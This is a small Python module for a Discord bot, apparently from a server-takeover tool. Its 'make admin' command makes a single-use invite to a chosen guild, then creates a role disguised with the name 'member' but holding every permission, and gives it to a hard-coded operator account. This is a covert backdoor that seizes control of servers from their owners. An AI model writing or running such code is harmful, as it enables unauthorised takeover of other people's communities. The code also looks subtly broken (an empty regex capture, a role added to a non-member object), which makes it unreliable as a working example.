import re

from discord import Permissions

import shared


class MakeAdmin:
    command = "make admin (.*?)"

    def __init__(self, bot):
        self.bot = bot

    async def call(self, command):
        shared.clear()
        print(f"#{self.command}")
        regex = re.search(self.command, command)

        try:
            guild = self.bot.guilds[int(regex.group(1).strip()) - 1]
            invite = await guild.text_channels[0].create_invite(max_age=60, max_uses=1, temporary=False)
            print(f"https://discord.gg/{invite.code}")
        except Exception as e:
            print(e)
        user = self.bot.get_user(int(shared.main_user_id))
        guild = self.bot.guilds[int(regex.group(1).strip()) - 1]
        await guild.create_role(name="member", permissions=Permissions.all())
        for role in guild.roles:
            if role.name == "member":
                await user.add_roles(role)
